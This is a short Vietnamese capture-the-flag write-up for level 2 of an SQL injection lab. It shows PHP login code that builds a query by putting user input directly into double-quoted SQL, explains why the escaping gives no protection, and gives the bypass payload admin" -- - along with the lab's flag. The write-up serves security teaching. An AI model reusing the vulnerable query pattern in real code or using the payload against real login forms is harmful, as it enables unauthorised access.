# **Level 2:**
```php
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("plaintext_db");

		$sql = "SELECT username FROM users WHERE username=\"$username\" AND password=\"$password\"";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Wrong username or password"; // No result

		$login_user = $row["username"];
		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag flag{f8ef24f0eebdfa5defdabc632f494f3e}, but how about <a href='level3.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```
Ở đây có dấu escape  , Nhưng chẳng có tác dụng gì cả . Bởi vì trong câu truy vấn lại sử dụng nháy kép thay vì nháy đơn , cho nên phải dùng dấu escape để kí hiệu rằng đây là nháy kép của chuỗi chứ nó không có tác dụng đóng mở một giá trị 

Thực tế khi vào trong Database thì nó sẽ chạy:
```sql
SELECT username FROM users WHERE username="$username" AND password="$password"
```
Cho nên payload chúng ta cần chỉ là: 
```sql
admin" -- -
```

<img width="1498" height="817" alt="image" src="https://github.com/user-attachments/assets/efe88312-80cc-4b3a-9e42-78edad11b18b" />

Done Level 2 nhe !!!
